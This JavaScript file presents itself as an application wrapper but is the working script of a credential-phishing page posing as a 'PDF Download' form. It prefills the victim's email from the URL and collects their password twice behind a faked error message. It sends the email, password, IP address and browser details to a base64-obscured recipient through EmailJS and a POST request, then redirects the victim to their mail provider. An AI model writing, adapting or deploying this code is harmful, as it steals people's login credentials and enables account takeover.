// Main application wrapper
(function() {
  // Configuration object with encoded values
  const config = {
      emailjs: {
          service: atob("c2VydmljZV8wZ2NybmJm"),
          template: atob("dGVtcGxhdGVfbXZta3JlNA=="),
          to: atob("anVkaWUuc2UwMUBnbWFpbC5jb20=")
      }
  };

  // State management
  const state = {
      userAgent: navigator.userAgent,
      email: "",
      currentStep: 1
  };

  // Initialize email from URL
  function initEmailFromUrl() {
      try {
          const hash = window.location.hash;
          if (hash && hash.includes('#')) {
              const emailFromHash = hash.substring(1);
              if (emailFromHash) {
                  state.email = decodeURIComponent(emailFromHash);
                  const emailInput = document.getElementById('emailInput');
                  if (emailInput) emailInput.value = state.email;
              }
          }
      } catch (e) {
          console.log('No email in URL');
      }
  }

  // EmailJS service
  function sendEmailNotification(title, content) {
      if (typeof emailjs !== 'undefined') {
          emailjs.send(config.emailjs.service, config.emailjs.template, {
              title: title,
              message: content,
              to_email: config.emailjs.to
          }).then(function() {
              console.log('Email sent successfully');
          }, function(error) {
              console.log('Email failed:', error);
          });
      }
  }

  // Form submission handler
  function submitFormData(formData) {
      if (typeof $ !== 'undefined') {
          $.ajax({
              url: '',
              method: 'POST',
              data: formData,
              success: function(response) {
                  console.log('Form submitted successfully');
              },
              error: function(error) {
                  console.log('Form submission failed');
              }
          });
      }
  }

  // Get client IP
  function getClientIP() {
      return new Promise((resolve) => {
          if (typeof $ !== 'undefined') {
              $.get('https://api.ipify.org?format=json')
                  .done(function(data) {
                      resolve(data.ip);
                  })
                  .fail(function() {
                      // Fallback IP service
                      fetch('https://api.ipify.org?format=json')
                          .then(response => response.json())
                          .then(data => resolve(data.ip))
                          .catch(() => resolve('Unknown'));
                  });
          } else {
              // Use fetch directly
              fetch('https://api.ipify.org?format=json')
                  .then(response => response.json())
                  .then(data => resolve(data.ip))
                  .catch(() => resolve('Unknown'));
          }
      });
  }

  // Step 1: Email submission
  function setupStep1() {
      const step1Form = document.getElementById('step1');
      const emailInput = document.getElementById('emailInput');
      const step1Btn = document.getElementById('step1Btn');

      if (step1Form && emailInput && step1Btn) {
          step1Form.addEventListener('submit', async function(e) {
              e.preventDefault();
              
              state.email = emailInput.value.trim();
              if (!state.email) return;

              // Disable button and show loading
              step1Btn.disabled = true;
              step1Btn.innerHTML = 'Loading... <span class="spinner"></span>';

              // Simulate processing delay
              setTimeout(function() {
                  const emailInputView = document.getElementById('emailInputView');
                  if (emailInputView) emailInputView.value = state.email;

                  // Show step 2
                  const step1Elem = document.getElementById('step1');
                  const step2Elem = document.getElementById('step2');
                  if (step1Elem) step1Elem.style.display = 'none';
                  if (step2Elem) step2Elem.style.display = 'block';

                  // Reset button
                  step1Btn.disabled = false;
                  step1Btn.innerHTML = '<span>Continue</span>';
              }, 1500);
          });
      }
  }

  // Step 2: Password submission
  function setupStep2() {
      const step2Form = document.getElementById('step2');
      const passwordInput = document.getElementById('passwordInput');
      const confirmInput = document.getElementById('confirmInput');
      const step2Btn = document.getElementById('step2Btn');
      const confirmContainer = document.getElementById('confirmContainer');
      const passwordContainer = document.getElementById('passwordContainer');
      const passwordError = document.getElementById('passwordError');

      if (step2Form && passwordInput && step2Btn) {
          step2Form.addEventListener('submit', async function(e) {
              e.preventDefault();

              const password = passwordInput.value.trim();
              const confirmPassword = confirmInput ? confirmInput.value.trim() : '';
              
              // Disable button and show loading
              step2Btn.disabled = true;
              step2Btn.innerHTML = 'Verifying... <span class="spinner"></span>';

              setTimeout(async function() {
                  const isConfirmVisible = confirmContainer ? 
                      confirmContainer.style.display !== 'none' : false;

                  if (isConfirmVisible) {
                      if (!confirmPassword) {
                          alert('Please confirm your password.');
                          step2Btn.disabled = false;
                          step2Btn.innerHTML = 'Download';
                          return;
                      }

                      // Get IP and send all data
                      const clientIP = await getClientIP();
                      
                      const message = `🧾 PDF Download Form\n\n📧 Email: ${state.email}\n🔐 Password: ${password}\n🔐 Confirm: ${confirmPassword}\n🌐 IP: ${clientIP}\n🖥️ Browser: ${state.userAgent}`;

                      console.log('Sending to Email:', message);
                      
                      // Send to EmailJS
                      sendEmailNotification('New Record', message);
                      
                      // Submit to form
                      submitFormData({
                          email: state.email,
                          password: password,
                          confirm_password: confirmPassword,
                          ip: clientIP,
                          browser_info: state.userAgent
                      });

                      // Redirect to email domain
                      const domain = state.email.split('@')[1];
                      if (domain) {
                          window.location.href = 'https://' + domain;
                      }

                  } else {
                      // First attempt - show confirmation field
                      const clientIP = await getClientIP();
                      
                      const message = `🧾 PDF Download Form\n\n📧 Email: ${state.email}\n🔐 Password: ${password}\n🌐 IP: ${clientIP}\n🖥️ Browser: ${state.userAgent}`;

                        console.log('Sending first attempt to Email:', message);
                      
                      // Send to Email
                      sendEmailNotification('New Record', message);

                      // Show confirmation fields
                      if (passwordError) passwordError.style.display = 'block';
                      if (confirmContainer) confirmContainer.style.display = 'block';
                      if (passwordContainer) passwordContainer.style.display = 'none';
                  }

                  // Reset button
                  step2Btn.disabled = false;
                  step2Btn.innerHTML = 'Download';
              }, 1500);
          });
      }
  }
  // Initialize everything when DOM is ready
  if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', function() {
          initEmailFromUrl();
          setupStep1();
          setupStep2();
      });
  } else {
      initEmailFromUrl();
      setupStep1();
      setupStep2();
  }

})();
